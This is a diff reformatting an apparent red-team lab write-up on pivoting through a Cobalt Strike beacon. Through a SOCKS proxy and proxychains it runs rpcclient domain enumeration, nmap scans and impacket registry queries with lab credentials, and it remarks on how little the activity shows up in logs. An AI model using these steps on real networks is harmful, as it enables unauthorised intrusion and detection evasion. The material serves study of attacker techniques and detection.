@@ -38,68 +38,62 @@ The below shows a couple of things. First one - two Cobalt Strike sessions:
 
 Second - attacker opens a socks4 proxy on port 7777 on his local kali machine (10.0.0.5) by issuing:
 
-{% code title="attacker@cobaltstrike" %}
 ```
+// attacker@cobaltstrike
 socks 7777
 ```
-{% endcode %}
 
-![](<../../.gitbook/assets/Screenshot from 2019-02-05 00-08-58.png>)
+![[Screenshot from 2019-02-05 00-08-58.png]]
 
 This means that the attacker can now use proxychains to proxy traffic from their kali box through the beacon to the target (attacker ---> beacon ---> end target).
 
 Let's see how this works by firstly updating the proxychains config file:
 
-{% code title="attacker@kali" %}
 ```
+// attacker@kali
 nano /etc/proxychains.conf
 ```
-{% endcode %}
 
-![](<../../.gitbook/assets/Screenshot from 2019-02-04 23-20-21.png>)
+![[Screenshot from 2019-02-04 23-20-21.png]]
 
 ### Enumeration
 
 Once proxychains are configured, the attacker can start enumerating the AD environment through the beacon like so:
 
-{% code title="attacker@kali" %}
 ```
+// attacker@kali
 proxychains rpcclient 10.0.0.6 -U spotless
 enumdomusers
 ```
-{% endcode %}
 
-![Victim (10.0.0.2) is enumerating DC (10.0.0.6) on behalf of attacker (10.0.0.5)](<../../.gitbook/assets/Screenshot from 2019-02-05 20-22-43.png>)
+![[Screenshot from 2019-02-05 20-22-43.png|Victim (10.0.0.2) is enumerating DC (10.0.0.6) on behalf of attacker (10.0.0.5)]]
 
 Moving on, same way, they can query info about specific AD users:
 
-{% code title="attacker@kali" %}
 ```
+// attacker@kali
 queryuser spotless
 ```
-{% endcode %}
 
-![](<../../.gitbook/assets/Screenshot from 2019-02-04 23-34-33.png>)
+![[Screenshot from 2019-02-04 23-34-33.png]]
 
 Enumerate current user's privileges and many more (consult rpcclient for all available commands):
 
-{% code title="attacker@kali" %}
 ```
+// attacker@kali
 enumprivs
 ```
-{% endcode %}
 
-![](<../../.gitbook/assets/Screenshot from 2019-02-04 23-34-42 (1).png>)
+![[Screenshot from 2019-02-04 23-34-42 (1).png]]
 
 Finally, of course they can run nmap if needed:
 
-{% code title="attacker@kali" %}
 ```csharp
+// attacker@kali
 proxychains nmap 10.0.0.6 -T4 -p 21,22,23,53,80,443,25 -sT
 ```
-{% endcode %}
 
-![](<../../.gitbook/assets/Screenshot from 2019-02-04 23-36-48.png>)
+![[Screenshot from 2019-02-04 23-36-48.png]]
 
 ### Impacket
 
@@ -107,35 +101,34 @@ Impacket provides even more tools to enumerate remote systems through compromise
 
 This is what happens - attacker (10.0.0.5) uses proxychains with impacket's reg utility to retrieve the hostname of the box at 10.0.0.7 (WS02) via the compromised (CS beacon) box 10.0.0.2 (WS01):
 
-{% code title="attacker@kali" %}
 ```csharp
+// attacker@kali
 proxychains reg.py offense/administrator:123456@10.0.0.2 -target-ip 10.0.0.7 query -keyName hklm\system\currentcontrolset\control\computername\computername
 ```
-{% endcode %}
 
 The below shows traffic captures that illustrate that the box 10.0.0.2 enumerates 10.0.0.7 using SMB traffic only:
 
-![](<../../.gitbook/assets/Peek 2019-02-09 19-50.gif>)
+![[Peek 2019-02-09 19-50.gif]]
 
 Below further proves that the box 10.0.0.2 (WS01 which acted as proxy) did not generate any sysmon logs and the target box 10.0.0.7 (WS02) logged a couple of events, that most likely would not attract much attention from the blue teams:
 
-![](<../../.gitbook/assets/Screenshot from 2019-02-09 19-59-58.png>)
+![[Screenshot from 2019-02-09 19-59-58.png]]
 
 ## Observations
 
 Note how only the SMB traffic between the compromised system and the DC is generated, but no new processes are spawned by the infected `dllhost` process:
 
-![](<../../.gitbook/assets/Peek 2019-02-05 20-24.gif>)
+![[Peek 2019-02-05 20-24.gif]]
 
-![](<../../.gitbook/assets/Screenshot from 2019-02-04 23-18-20.png>)
+![[Screenshot from 2019-02-04 23-18-20.png]]
 
 ## References
 
-{% embed url="https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html" %}
+[www.samba.org/samba/docs/current/man-html/rpcclient.1.html](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html)
 
-{% embed url="https://github.com/SecureAuthCorp/impacket/tree/master/examples" %}
+[github.com/SecureAuthCorp/impacket/tree/master/examples](https://github.com/SecureAuthCorp/impacket/tree/master/examples)
 
-{% embed url="https://www.cobaltstrike.com/help-socks-proxy-pivoting" %}
+[www.cobaltstrike.com/help-socks-proxy-pivoting](https://www.cobaltstrike.com/help-socks-proxy-pivoting)
 
-{% embed url="https://www.youtube.com/watch?v=l8nkXCOYQC4&index=19&list=WL&t=7s" %}
+[www.youtube.com/watch?v=l8nkXCOYQC4&index=19&list=WL&t=7s](https://www.youtube.com/watch?v=l8nkXCOYQC4&index=19&list=WL&t=7s)
 
